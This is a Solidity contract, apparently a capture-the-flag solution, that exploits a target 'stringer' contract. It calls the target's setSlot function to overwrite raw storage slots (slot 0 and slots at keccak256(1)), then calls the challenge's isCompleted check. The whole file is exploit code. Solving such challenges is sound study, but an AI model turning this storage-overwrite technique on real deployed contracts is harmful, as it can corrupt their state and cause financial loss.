pragma solidity ^0.8.0;
import "./string.sol";
contract attck{
    stringer str;
    constructor(address _str){
        str = stringer(_str);
    }
    //设置slot0为0x000000000000000000000000000000000000000000000000000000000000000a
    //设置figure计算出的slot为0x0000000000000000000000000000000000000000000000000000000000000000
    //slot+1为0x0000000000000000000000000000000000000000000000000000000000000000即可
    function figure()public pure returns(bytes32){
        return(keccak256(abi.encodePacked(uint256(1))));
    }

    function att()public{
        str.setSlot(bytes32(uint256(0)),0x000000000000000000000000000000000000000000000000000000000000000a);
        str.setSlot(figure(),0x0000000000000000000000000000000000000000000000000000000000000000);
        str.setSlot(bytes32(uint256(figure())+1),0x0000000000000000000000000000000000000000000000000000000000000000);
    }

    function complete()public{
        str.isCompleted();
    }
    
}